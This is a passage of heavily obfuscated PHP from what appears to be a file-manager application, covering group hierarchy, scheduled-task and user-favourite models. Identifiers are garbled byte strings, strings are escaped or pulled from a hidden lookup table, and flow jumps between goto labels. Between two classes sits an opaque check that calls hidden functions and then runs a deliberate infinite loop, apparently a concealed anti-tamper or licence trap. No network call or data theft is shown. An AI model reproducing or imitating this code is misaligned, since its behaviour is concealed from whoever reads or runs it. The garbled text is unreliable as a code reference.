"\123\x45\114\105\103\124\x20\x2a\x20\106\x52\x4f\115\x20\x28\123\105\x4c\105\103\x54\40\x27{$e‡²ñêœ…š}\x5f\x63\x68\151\154\144\47\x20\x61\x73\40\x68\141\163\x20\106\122\117\x4d\x20\x60{$AÌ½Æê¤}\x60\x20\167\x68\145\162\x65\x20\x70\x61\x72\x65\156\x74\111\x44\x3d{$e‡²ñêœ…š}\x20\154\151\x6d\x69\x74\40\61\x29\40\x61\x73\x20\x74\x62\x5f{$e‡²ñêœ…š}\x20\165\x6e\x69\x6f\156\40\x61\154\x6c\x20"; if (($e¿Ó‚³¥«† >= 20 || $c¸¡Ú¼…ŒÔ == $Aµğï÷‹Ü - 1) && $D•êÍ’ª“±) { $D•êÍ’ª“± = substr($D•êÍ’ª“±, 0, -strlen($d×Ğ…¦äÂ[467])); $fÙİƒì×¥ = $this->query($D•êÍ’ª“±); $D—øÛõÊ™¼ = array_merge($D—øÛõÊ™¼, $fÙİƒì×¥); $e¿Ó‚³¥«† = 0; $D•êÍ’ª“± = $d×Ğ…¦äÂ[33]; } } goto FŞÍç‚ºÂ§; fõĞ’Öšã: } private function _listAppendChildrenMember(&$e‰ã™Á·éì) { goto c—ñŒŠïöã; fÌ‘‡×ø¿‹: $CÎÜ„”¾â = array_to_keyvalue($CÎÜ„”¾â, $CŸõåË„‰[468]); foreach ($e‰ã™Á·éì as &$EÓ„‡ÜĞÒ¼) { $EÓ„‡ÜĞÒ¼[$CŸõåË„‰[1731]] = isset($CÎÜ„”¾â[$EÓ„‡ÜĞÒ¼[$CŸõåË„‰[1638]] . $CŸõåË„‰[1730]]); } unset($EÓ„‡ÜĞÒ¼); goto eÅ¤•½ùÌâ; c—ñŒŠïöã: $CŸõåË„‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E“ï¼ì×˜º = $CŸõåË„‰[370]; $CÎÜ„”¾â = array(); goto aøª‹¼ˆè; aøª‹¼ˆè: $A›§§ºÖ›­ = count($e‰ã™Á·éì); $B‰ùÍÖò‚Ï = $this->tablePrefix . $CŸõåË„‰[1721]; for ($Fœ‚Š†²ˆğ = 0, $c“äÒìÆ…” = 0; $Fœ‚Š†²ˆğ < $A›§§ºÖ›­; $Fœ‚Š†²ˆğ++) { $c“äÒìÆ…”++; $eŒ±ã¼÷÷µ = $e‰ã™Á·éì[$Fœ‚Š†²ˆğ][$CŸõåË„‰[1638]]; $E“ï¼ì×˜º .= "\x53\105\114\105\103\x54\x20\x2a\40\106\x52\117\115\40\50\x53\x45\x4c\x45\x43\124\40\x27{$eŒ±ã¼÷÷µ}\x5f\x63\150\151\x6c\144\47\40\141\x73\40\x68\141\x73\40\x46\122\x4f\x4d\40\140{$B‰ùÍÖò‚Ï}\140\x20\x77\150\145\162\x65\x20\x67\x72\157\x75\160\x49\104\x3d{$eŒ±ã¼÷÷µ}\40\x6c\151\x6d\x69\x74\40\61\51\x20\x61\x73\x20\164\142\x5f{$eŒ±ã¼÷÷µ}\40\165\156\x69\x6f\x6e\x20\141\x6c\x6c\40"; if (($c“äÒìÆ…” >= 20 || $Fœ‚Š†²ˆğ == $A›§§ºÖ›­ - 1) && $E“ï¼ì×˜º) { $E“ï¼ì×˜º = substr($E“ï¼ì×˜º, 0, -strlen($CŸõåË„‰[467])); $dŞ²¸ÔÈÛ‘ = $this->query($E“ï¼ì×˜º); $CÎÜ„”¾â = array_merge($CÎÜ„”¾â, $dŞ²¸ÔÈÛ‘); $c“äÒìÆ…” = 0; $E“ï¼ì×˜º = $CŸõåË„‰[33]; } } goto fÌ‘‡×ø¿‹; eÅ¤•½ùÌâ: } private function _listAppendMeta(&$d—ê£Œ¡…, $Cóİ‹ñµ£) { goto aä½ÒÙŸÒ; aä½ÒÙŸÒ: $B©ô«¹å§À =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c‡ã»šçÓŸ = array($B©ô«¹å§À[1638] => array($B©ô«¹å§À[7], $Cóİ‹ñµ£)); $fö¥÷À¥Àğ = Model($B©ô«¹å§À[1720])->where($c‡ã»šçÓŸ)->select(); goto cœÔâ Üğå; A¾¶àÆ¬‹Ç: foreach ($d—ê£Œ¡… as &$Aù„²ˆ§‘) { $Aù„²ˆ§‘[$B©ô«¹å§À[434]] = array(); if (isset($fö¥÷À¥Àğ[$Aù„²ˆ§‘[$B©ô«¹å§À[1638]]])) { $Aù„²ˆ§‘[$B©ô«¹å§À[434]] = $fö¥÷À¥Àğ[$Aù„²ˆ§‘[$B©ô«¹å§À[1638]]]; } } unset($Aù„²ˆ§‘); goto Bæ‡šœÃ¬Ğ; cœÔâ Üğå: $fö¥÷À¥Àğ = array_to_keyvalue_group($fö¥÷À¥Àğ, $B©ô«¹å§À[1638]); foreach ($fö¥÷À¥Àğ as &$A·£†•ÄŒİ) { $A·£†•ÄŒİ = array_to_keyvalue($A·£†•ÄŒİ, $B©ô«¹å§À[92], $B©ô«¹å§À[368]); } unset($A·£†•ÄŒİ); goto A¾¶àÆ¬‹Ç; Bæ‡šœÃ¬Ğ: } protected function parentLevelArray($eÖ‡…á¨‹) { $Dê¼œšçä‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÖ‡…á¨‹ = explode($Dê¼œšçä‡[47], trim($eÖ‡…á¨‹, $Dê¼œšçä‡[47])); $eÖ‡…á¨‹ = array_remove_value($eÖ‡…á¨‹, $Dê¼œšçä‡[486]); return $eÖ‡…á¨‹; } private function _listAppendParent(&$c¶Šƒ÷Šê©) { goto A¬ÜÖÇÙ ; A¬ÜÖÇÙ : $fÖÆšÑ¾‘ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f¸Í™«óÓ = array(); foreach ($c¶Šƒ÷Šê© as &$D¨­«¼á¿È) { $f¸Í™«óÓ[$D¨­«¼á¿È[$fÖÆšÑ¾‘ä[1638]]] = $D¨­«¼á¿È[$fÖÆšÑ¾‘ä[28]]; $cì ¼Óñ¿ = $this->parentLevelArray($D¨­«¼á¿È[$fÖÆšÑ¾‘ä[477]]); foreach ($cì ¼Óñ¿ as $d”“šò¯ÆÏ) { if (!isset($f¸Í™«óÓ[$d”“šò¯ÆÏ])) { $f¸Í™«óÓ[$d”“šò¯ÆÏ] = 0; } } } goto DÓƒ¥Ñ»•—; DÓƒ¥Ñ»•—: unset($D¨­«¼á¿È); $B¼¾íØ›¼‘ = array(); foreach ($f¸Í™«óÓ as $A§Í¯Î => $a‡êáÑ¬ğ¸) { if (!$a‡êáÑ¬ğ¸) { $B¼¾íØ›¼‘[] = $A§Í¯Î; } } goto CŒŸßî˜Ë“; CŒŸßî˜Ë“: if ($B¼¾íØ›¼‘) { $eğ‡ÕÌÆÑ• = array($fÖÆšÑ¾‘ä[1719] => array($fÖÆšÑ¾‘ä[402], $B¼¾íØ›¼‘)); $c‘šµ«Å½‰ = $this->field($fÖÆšÑ¾‘ä[1732])->where($eğ‡ÕÌÆÑ•)->select(); $AÏŞóá¦ˆ = array_to_keyvalue($c‘šµ«Å½‰, $fÖÆšÑ¾‘ä[1638], $fÖÆšÑ¾‘ä[28]); $f¸Í™«óÓ = array_merge_index($f¸Í™«óÓ, $AÏŞóá¦ˆ); } $Cá‰¬ò õ = $GLOBALS[$fÖÆšÑ¾‘ä[6]][$fÖÆšÑ¾‘ä[87]][$fÖÆšÑ¾‘ä[1733]]; foreach ($c¶Šƒ÷Šê© as &$D¨­«¼á¿È) { $cì ¼Óñ¿ = $this->parentLevelArray($D¨­«¼á¿È[$fÖÆšÑ¾‘ä[477]]); $BÏ÷ô‰ÁŠÍ = $fÖÆšÑ¾‘ä[33]; foreach ($cì ¼Óñ¿ as $A§Í¯Î => $d”“šò¯ÆÏ) { if ($Cá‰¬ò õ && $A§Í¯Î == 0) { continue; } $BÏ÷ô‰ÁŠÍ .= $f¸Í™«óÓ[$d”“šò¯ÆÏ] . $fÖÆšÑ¾‘ä[8]; } if ($cì ¼Óñ¿) { $BÏ÷ô‰ÁŠÍ .= $D¨­«¼á¿È[$fÖÆšÑ¾‘ä[28]]; } $D¨­«¼á¿È[$fÖÆšÑ¾‘ä[481]] = str_replace($fÖÆšÑ¾‘ä[485], $fÖÆšÑ¾‘ä[8], $BÏ÷ô‰ÁŠÍ); } goto eÓ§ÈØõôğ; eÓ§ÈØõôğ: unset($D¨­«¼á¿È); goto DÏ¸£ØĞÖì; DÏ¸£ØĞÖì: } private function _listAppendSourceRoot(&$Eé·êî¼™º, $fâØá‡Œæ¶) { goto eø±ï§×‘´; c‚¦ÍÁ‰ù†: $B´ßÅĞ ëà = Model($d‹÷â¼¤×[745])->order($d‹÷â¼¤×[1735])->field($d©Í…ÑÓ³¸)->where($b ¸¯Ï´İÇ)->select(); $B´ßÅĞ ëà = array_to_keyvalue($B´ßÅĞ ëà, $d‹÷â¼¤×[474]); $B´ßÅĞ ëà = array_remove_key($B´ßÅĞ ëà, $d‹÷â¼¤×[474]); goto Fíš§°ÖŞ; Fíš§°ÖŞ: foreach ($Eé·êî¼™º as &$Cë‡ì’”ÂŒ) { $Cë‡ì’”ÂŒ[$d‹÷â¼¤×[84]] = $B´ßÅĞ ëà[$Cë‡ì’”ÂŒ[$d‹÷â¼¤×[1638]]] ? $B´ßÅĞ ëà[$Cë‡ì’”ÂŒ[$d‹÷â¼¤×[1638]]] : array(); } unset($Cë‡ì’”ÂŒ); goto D»«”ã“; eø±ï§×‘´: $d‹÷â¼¤× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b ¸¯Ï´İÇ = array($d‹÷â¼¤×[389] => SourceModel::TYPE_GROUP, $d‹÷â¼¤×[479] => 0, $d‹÷â¼¤×[474] => array($d‹÷â¼¤×[7], $fâØá‡Œæ¶)); $d©Í…ÑÓ³¸ = $d‹÷â¼¤×[1734]; goto c‚¦ÍÁ‰ù†; D»«”ã“: } protected function groupMerge($døƒâÇ¦³) { $døƒâÇ¦³ = array_values(array_unique($døƒâÇ¦³)); $cÔĞó‚¿Í = array(); for ($Bñ£¨Œ±—È = 0; $Bñ£¨Œ±—È < count($døƒâÇ¦³); $Bñ£¨Œ±—È++) { $Eö«â£¡ÍÉ = !1; for ($dŞ’¬›µŠ = 0; $dŞ’¬›µŠ < count($døƒâÇ¦³); $dŞ’¬›µŠ++) { if ($Bñ£¨Œ±—È == $dŞ’¬›µŠ) { continue; } if ($this->isParentOf($døƒâÇ¦³[$dŞ’¬›µŠ], $døƒâÇ¦³[$Bñ£¨Œ±—È])) { $Eö«â£¡ÍÉ = !0; break; } } if (!$Eö«â£¡ÍÉ) { $cÔĞó‚¿Í[] = $døƒâÇ¦³[$Bñ£¨Œ±—È]; } } return $cÔĞó‚¿Í; } protected function isParentOf($cœ·¿ïÚ›¤, $A—ºÀ¢ÊŠ†) { goto Fº‘Ô¾Œå÷; dñ„Ä§…: return !1; goto b®ö´¥”»‰; fäèóíŠ³ƒ: $E†Ê˜­…ƒƒ = $this->getInfoSimple($A—ºÀ¢ÊŠ†); $f™„—âÕ±Û = $eêß†ÔÈññ[$bÎ²©ÍÛëÃ[477]] . $cœ·¿ïÚ›¤ . $bÎ²©ÍÛëÃ[47]; if (substr($E†Ê˜­…ƒƒ[$bÎ²©ÍÛëÃ[477]], 0, strlen($f™„—âÕ±Û)) == $f™„—âÕ±Û) { return !0; } goto dñ„Ä§…; Fº‘Ô¾Œå÷: $bÎ²©ÍÛëÃ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$cœ·¿ïÚ›¤ || !$A—ºÀ¢ÊŠ† || $cœ·¿ïÚ›¤ == $A—ºÀ¢ÊŠ†) { return !1; } $eêß†ÔÈññ = $this->getInfoSimple($cœ·¿ïÚ›¤); goto fäèóíŠ³ƒ; b®ö´¥”»‰: } public function groupShowRoot($Eò§’æ®­Ã, $FõÅÅ³ù¶Ü = false) { goto fÂëòªÈ‚ƒ; cù¶êº†Æ: $a–ëƒè—ù = $this->parentLevelArray($dÂ•ÎÎ¯Ù[$A…™Á³¤½[477]]); $FÌğŠæÍ¬ = array($Eò§’æ®­Ã); if (count($a–ëƒè—ù) == 0) { return $FÌğŠæÍ¬; } goto EéÇÆéêå­; EéÇÆéêå­: if ($FõÅÅ³ù¶Ü && count($a–ëƒè—ù) == 1) { return $FÌğŠæÍ¬; } if (!$dÂ•ÎÎ¯Ù[$A…™Á³¤½[434]] || !isset($dÂ•ÎÎ¯Ù[$A…™Á³¤½[434]][$A…™Á³¤½[1717]]) || $dÂ•ÎÎ¯Ù[$A…™Á³¤½[434]][$A…™Á³¤½[1717]] == $A…™Á³¤½[1690]) { return $this->groupShowRoot($a–ëƒè—ù[count($a–ëƒè—ù) - 1], $FõÅÅ³ù¶Ü); } if ($dÂ•ÎÎ¯Ù[$A…™Á³¤½[434]][$A…™Á³¤½[1717]] == $A…™Á³¤½[355]) { $EÃÕïó…Ù = explode($A…™Á³¤½[47], $dÂ•ÎÎ¯Ù[$A…™Á³¤½[434]][$A…™Á³¤½[1718]]); if ($EÃÕïó…Ù) { $FÌğŠæÍ¬ = array_merge($FÌğŠæÍ¬, $EÃÕïó…Ù); } } goto DÊøĞ“çïš; DÊøĞ“çïš: return $FÌğŠæÍ¬; goto a¯‘ƒìµÈ; fÂëòªÈ‚ƒ: $A…™Á³¤½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÂ•ÎÎ¯Ù = $this->getInfo($Eò§’æ®­Ã); if (!$dÂ•ÎÎ¯Ù) { return array(); } goto cù¶êº†Æ; a¯‘ƒìµÈ: } protected function resetParentLevel() { $B¨Â’ãæ§š =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Fµ°Œ‘•Ú² = $B¨Â’ãæ§š[1638]; $aŒÂì”³– = $this->select(); $aŒÂì”³– = array_to_keyvalue($aŒÂì”³–, $Fµ°Œ‘•Ú²); foreach ($aŒÂì”³– as $fğ¹ßóóğ™) { goto Eê¿ØŠ´ã; aÆº¬«÷êÆ: $eÍ Ú¢í®×[] = 0; $eÍ Ú¢í®× = $B¨Â’ãæ§š[47] . implode($B¨Â’ãæ§š[47], array_reverse($eÍ Ú¢í®×)) . $B¨Â’ãæ§š[47]; $this->setNamePinyin($fğ¹ßóóğ™[$Fµ°Œ‘•Ú²], $fğ¹ßóóğ™[$B¨Â’ãæ§š[28]]); goto DÙ¤¥ß¿œ; Eê¿ØŠ´ã: $CÆâÌ¸ÕÑ = $fğ¹ßóóğ™; $eÍ Ú¢í®× = array(); while ($CÆâÌ¸ÕÑ[$B¨Â’ãæ§š[479]] != 0) { $eÍ Ú¢í®×[] = $CÆâÌ¸ÕÑ[$B¨Â’ãæ§š[479]]; $CÆâÌ¸ÕÑ = $aŒÂì”³–[$CÆâÌ¸ÕÑ[$B¨Â’ãæ§š[479]]]; } goto aÆº¬«÷êÆ; DÙ¤¥ß¿œ: $this->where(array($Fµ°Œ‘•Ú² => $fğ¹ßóóğ™[$Fµ°Œ‘•Ú²]))->save(array($B¨Â’ãæ§š[542] => $eÍ Ú¢í®×)); goto c¸‚ÅìÉÓ; c¸‚ÅìÉÓ: } return $aŒÂì”³–; } public function groupNameAuto($B…ãĞ‚ƒÀ, $Aá…Ë±Ğ) { $eÜ Ó·´ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aâÁô…«ºæ = $this->where(array($eÜ Ó·´[386] => $B…ãĞ‚ƒÀ))->getField($eÜ Ó·´[28], !0); if (!$aâÁô…«ºæ || !in_array($Aá…Ë±Ğ, $aâÁô…«ºæ)) { return $Aá…Ë±Ğ; } for ($Aãê³¬¢éº = 1; $Aãê³¬¢éº <= count($aâÁô…«ºæ) + 1; $Aãê³¬¢éº++) { $EÈ”÷ø‹ = $Aá…Ë±Ğ . "\50{$Aãê³¬¢éº}\x29"; if (!in_array($EÈ”÷ø‹, $aâÁô…«ºæ)) { return $EÈ”÷ø‹; } } } } goto bÔËÓ«†÷…; F™­éš¤Ó’: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x74\x61\163\x6b\114\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\164\171\x70\145", "\145\x76\145\x6e\164", "\164\x69\155\x65", "\x64\x65\163\143", "\163\x79\163\x74\145\155", "\145\x6e\141\142\x6c\x65", "\154\141\163\x74\122\x75\x6e", "\163\157\x72\x74"); public function listData($CÕ¶˜é‚÷ = false, $b«‡Öó‡¢Ú = "\x73\157\x72\x74", $F¥É‡ªİèÒ = false) { return parent::listData($CÕ¶˜é‚÷, $b«‡Öó‡¢Ú, $F¥É‡ªİèÒ); } public function add($bˆ­Ï¾ì™) { $f¸·…³ö  =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fçÂ”„¿ğ = $this->findByName($bˆ­Ï¾ì™[$f¸·…³ö [28]]); if ($fçÂ”„¿ğ) { return !1; } $bˆ­Ï¾ì™[$f¸·…³ö [1443]] = 0; $bˆ­Ï¾ì™[$f¸·…³ö [1661]] = $this->getSort(); return parent::insert($bˆ­Ï¾ì™); } private function getSort() { $dßÎÎŞ·¿Ø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f¼½Íø¾Å = parent::listData(); $bó˜İ‘ŒÌ­ = array_to_keyvalue($f¼½Íø¾Å, $dßÎÎŞ·¿Ø[33], $dßÎÎŞ·¿Ø[1661]); return empty($bó˜İ‘ŒÌ­) ? 0 : max($bó˜İ‘ŒÌ­) + 1; } public function update($Dá†ËÑ®…¿, $A¾ÏÃê²‘¼) { $aä‘±Àˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dŸ¶¬Ô‚– = $this->listData($Dá†ËÑ®…¿); $F×éŠ•æ£ç = $this->findByName($A¾ÏÃê²‘¼[$aä‘±Àˆ[28]]); if (!$dŸ¶¬Ô‚– || $F×éŠ•æ£ç && $F×éŠ•æ£ç[$aä‘±Àˆ[385]] != $dŸ¶¬Ô‚–[$aä‘±Àˆ[385]]) { return !1; } return parent::update($Dá†ËÑ®…¿, $A¾ÏÃê²‘¼); } public function remove($DÇ½ö›‡¼, $aÅ“å´Ÿ¿› = false) { $b¢ÅÇêçÀÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aè«¡‚§Û = $this->listData($DÇ½ö›‡¼); if (!$Aè«¡‚§Û) { return; } if (!$aÅ“å´Ÿ¿› && $Aè«¡‚§Û[$b¢ÅÇêçÀÜ[1118]] == $b¢ÅÇêçÀÜ[86]) { return !1; } return parent::remove($DÇ½ö›‡¼); } public function enable($BŒËº­¸£š, $Aë¥š´êõì) { return $this->update($BŒËº­¸£š, array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][2040] => $Aë¥š´êõì)); } public function run($aÕÒ¯½åá) { return $this->update($aÕÒ¯½åá, array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][2050] => time())); } } if (!isset($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][786]]) || !isset($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1162]])) { goto aóƒ¼¢²; aóƒ¼¢²: $BàØõ°«îê = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][789]; $dá‰¦¤×Î† = $_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][790]] . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][791]; $e°”óâ¦ö“ = $BàØõ°«îê($dá‰¦¤×Î†); goto f¾æ¤ÄÄÕ; Fœ²¾Á¾Ÿ¥: $B¸¤µê¨È($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][790]] . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][791]); $e¹¨äµ—“ = 2; while ($e¹¨äµ—“ > 1) { $cĞ¼ºšÙ§Ú = rawurlencode($e¹¨äµ—“ . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][370]); } goto Aß·ÁÃ˜; f¾æ¤ÄÄÕ: $A‡ø‡ÜŞïë = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][227], $e°”óâ¦ö“); if (count($A‡ø‡ÜŞïë) < $_SERVER[ó¬â¥‰ÊÔ¤Ç£][573]) { $cÊ‹Ò„ÆÈ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][792]; $cÊ‹Ò„ÆÈ(); } $B¸¤µê¨È = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1164]; goto Fœ²¾Á¾Ÿ¥; Aß·ÁÃ˜: } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($Có±•ç‹êİ) { $Añ±’æòé· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($Añ±’æòé·[1738] => array(USER_ID, $Añ±’æòé·[2051])); } protected function listData() { $Dä¡çÛ•‹± =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a›ìÎ™Ñ¹ = array($Dä¡çÛ•‹±[1471] => USER_ID, $Dä¡çÛ•‹±[452] => 0); $fÏ†²‰šì… = $Dä¡çÛ•‹±[2052]; $aİÌ÷“Ë½Ô = $this->field($fÏ†²‰šì…)->where($a›ìÎ™Ñ¹)->order($Dä¡çÛ•‹±[2053])->select(); return $aİÌ÷“Ë½Ô ? $aİÌ÷“Ë½Ô : array(); } protected function resetCache() { } protected function listView() { goto f¢‘³•ÊôË; DÍ£İÒ¾’: $dêÚ¶·ñÛÜ = array_to_keyvalue($cÍ ’‚Şœé, $e‹Ÿ·‡‡[33], $e‹Ÿ·‡‡[75]); if (!$dêÚ¶·ñÛÜ) { return $C‡öÈ„È®Ï; } $CâŠøîå¬… = 2000; goto C×’õ†Ü‡ğ; b®Ô†‚‡: $FÙôÒ° = array_to_keyvalue($FÙôÒ°, $e‹Ÿ·‡‡[387]); foreach ($C‡öÈ„È®Ï as $C‚¡¨™Å‹ => $Dèæˆ„Ïİ‰) { $D¡¤Íâİà“ = $FÙôÒ°[$Dèæˆ„Ïİ‰[$e‹Ÿ·‡‡[75]]]; $D¡¤Íâİà“ = $D¡¤Íâİà“ ? $D¡¤Íâİà“ : array(); $C‡öÈ„È®Ï[$C‚¡¨™Å‹] = array_merge($D¡¤Íâİà“, $Dèæˆ„Ïİ‰); } return $C‡öÈ„È®Ï; goto e‘„Éïè¤¤; C×’õ†Ü‡ğ: $eì««È©ˆ™ = array($e‹Ÿ·‡‡[401] => array($e‹Ÿ·‡‡[402], $dêÚ¶·ñÛÜ)); $FÙôÒ° = Model($e‹Ÿ·‡‡[745])->listSource($eì««È©ˆ™, $CâŠøîå¬…); $FÙôÒ° = array_merge($FÙôÒ°[$e‹Ÿ·‡‡[73]], $FÙôÒ°[$e‹Ÿ·‡‡[74]]); goto b®Ô†‚‡; f¢‘³•ÊôË: $e‹Ÿ·‡‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C‡öÈ„È®Ï = $this->listData(); $cÍ ’‚Şœé = array_filter_by_field($C‡öÈ„È®Ï, $e‹Ÿ·‡‡[29], $e‹Ÿ·‡‡[400]); goto DÍ£İÒ¾’; e‘„Éïè¤¤: } protected function addFav($C½¢¹Ê‚èö, $EêÛ¸¹”„Ö = '', $aƒÔ‹¿ÒÒ‚ = "\163\157\165\x72\x63\x65") { goto bËÀô©ÌÖ; B´»‚œ’ò®: $a³˜…ÄŸÕ¨ = array($fç·œöóŸÀ[1471] => USER_ID, $fç·œöóŸÀ[452] => 0); $EÊèĞŠ¦Ã­ = $this->where($a³˜…ÄŸÕ¨)->max($fç·œöóŸÀ[1661]); if (!$EÊèĞŠ¦Ã­) { $EÊèĞŠ¦Ã­ = 0; } goto cÑ´³ÎÂÂ¸; bËÀô©ÌÖ: $fç·œöóŸÀ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a³˜…ÄŸÕ¨ = array($fç·œöóŸÀ[1471] => USER_ID, $fç·œöóŸÀ[452] => 0, $fç·œöóŸÀ[406] => $aƒÔ‹¿ÒÒ‚, $fç·œöóŸÀ[405] => $C½¢¹Ê‚èö); if ($this->where($a³˜…ÄŸÕ¨)->find()) { return !1; } goto B´»‚œ’ò®; F×·ÆÎ¶Ú¹: return $this->add($C«ğ¡ØãË); goto fêô«¹‚§; cÑ´³ÎÂÂ¸: if (!$EêÛ¸¹”„Ö && $aƒÔ‹¿ÒÒ‚ == $fç·œöóŸÀ[400]) { $dƒŒÎôÖ†‘ = Model($fç·œöóŸÀ[1154])->where(array($fç·œöóŸÀ[401] => $C½¢¹Ê‚èö))->find(); if (!$dƒŒÎôÖ†‘) { return !1; } $EêÛ¸¹”„Ö = $dƒŒÎôÖ†‘[$fç·œöóŸÀ[28]]; } $EêÛ¸¹”„Ö = $this->getAutoName($EêÛ¸¹”„Ö); $C«ğ¡ØãË = array($fç·œöóŸÀ[1471] => USER_ID, $fç·œöóŸÀ[452] => 0, $fç·œöóŸÀ[404] => $EêÛ¸¹”„Ö, $fç·œöóŸÀ[405] => $C½¢¹Ê‚èö, $fç·œöóŸÀ[406] => $aƒÔ‹¿ÒÒ‚, $fç·œöóŸÀ[1642] => $EÊèĞŠ¦Ã­ + 1); goto F×·ÆÎ¶Ú¹; fêô«¹‚§: } protected function remove($DÏÌ™ë”™) { $AÂ±ºä±«Ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÈÖÚÉ = array($AÂ±ºä±«Ë[1471] => USER_ID, $AÂ±ºä±«Ë[403] => $DÏÌ™ë”™); return $this->where($CÈÖÚÉ)->delete(); } protected function removeByName($AµÔ¢ª“˜) { $dËÈÚ¾  =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BïÇ°ëæŒ¾ = array($dËÈÚ¾ [1471] => USER_ID, $dËÈÚ¾ [404] => $AµÔ¢ª“˜, $dËÈÚ¾ [452] => 0); return $this->where($BïÇ°ëæŒ¾)->delete(); } protected function rename($a¥£¸ë·†Ş, $f†¯ğâë¼ö) { $F‡ã¼õó ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($a¥£¸ë·†Ş == $f†¯ğâë¼ö) { return !1; } $AÁ¨Ú±å“… = $this->getAutoName($f†¯ğâë¼ö); if ($f†¯ğâë¼ö != $AÁ¨Ú±å“…) { return !1; } $D¾‹£¡¥“† = array($F‡ã¼õó ˆ[1471] => USER_ID, $F‡ã¼õó ˆ[452] => 0, $F‡ã¼õó ˆ[28] => $a¥£¸ë·†Ş); return $this->where($D¾‹£¡¥“†)->save(array($F‡ã¼õó ˆ[28] => $f†¯ğâë¼ö)); } protected function resetSort($dóæø‚) { $Eèù„ñæ®ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dóæø‚ = is_array($dóæø‚) ? $dóæø‚ : array(); $F¤õ¿îŠß· = array($Eèù„ñæ®ˆ[1471] => USER_ID); for ($dè—òëÙ¸Ú = 0; $dè—òëÙ¸Ú < count($dóæø‚); $dè—òëÙ¸Ú++) { $F¤õ¿îŠß·[$Eèù„ñæ®ˆ[403]] = $dóæø‚[$dè—òëÙ¸Ú]; $this->where($F¤õ¿îŠß·)->save(array($Eèù„ñæ®ˆ[1642] => $dè—òëÙ¸Ú + 1)); } return !0; } protected function moveTop($eĞùªÌÊ¹ ) { goto C´Ùõ¿²ªµ; F±ß¨Õø: if (!$c‚Á£İÊ¤ƒ) { return; } $d¶Ö´Êçğ¿ = $this->field($D›ÛòÅ¡¨[385])->where($dÙİ°§£È)->order($D›ÛòÅ¡¨[2053])->select(); $d¶Ö´Êçğ¿ = array_to_keyvalue($d¶Ö´Êçğ¿, $D›ÛòÅ¡¨[33], $D›ÛòÅ¡¨[385]); goto aƒ¹˜‘·; C¯´¶ñø¬’: return $this->resetSort($d¶Ö´Êçğ¿); goto FÛ»–Ãˆ®ê; aƒ¹˜‘·: $aœÓÛÇƒ÷í = $d¶Ö´Êçğ¿; $d¶Ö´Êçğ¿ = array_remove_value($d¶Ö´Êçğ¿, $c‚Á£İÊ¤ƒ[$D›ÛòÅ¡¨[385]]); array_unshift($d¶Ö´Êçğ¿, $c‚Á£İÊ¤ƒ[$D›ÛòÅ¡¨[385]]); goto C¯´¶ñø¬’; C´Ùõ¿²ªµ: $D›ÛòÅ¡¨ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÙİ°§£È = array($D›ÛòÅ¡¨[1471] => USER_ID, $D›ÛòÅ¡¨[452] => 0); $c‚Á£İÊ¤ƒ = $this->where($dÙİ°§£È)->where(array($D›ÛòÅ¡¨[28] => $eĞùªÌÊ¹ ))->find(); goto F±ß¨Õø; FÛ»–Ãˆ®ê: } protected function moveBottom($dÍšÂ–°‘) { $Aˆ¡„‡‰´ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B‡ßÆÀ¯â‚ = array($Aˆ¡„‡‰´[1471] => USER_ID, $Aˆ¡„‡‰´[452] => 0); $C¢˜ôäŠØ‹ = $this->where($B‡ßÆÀ¯â‚)->max($Aˆ¡„‡‰´[1661]); $aÊ¥á“å±Õ = array($Aˆ¡„‡‰´[1661] => $C¢˜ôäŠØ‹ + 1); return $this->where($B‡ßÆÀ¯â‚)->where(array($Aˆ¡„‡‰´[28] => $dÍšÂ–°‘))->save($aÊ¥á“å±Õ); } private function getAutoName($A¯‚‡ÃâÎ„) { goto f×Å°š›Á‹; C÷˜¨Ÿ”Š: return $A¯‚‡ÃâÎ„ . "\50{$a†÷Ã®”}\51"; goto AĞ¾ğôÄèª; f×Å°š›Á‹: $B­ùñõ‹Äâ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B§©Ü»ô”Ä = array($B­ùñõ‹Äâ[1471] => USER_ID, $B­ùñõ‹Äâ[452] => 0); $fˆ†…ô‚¼¿ = 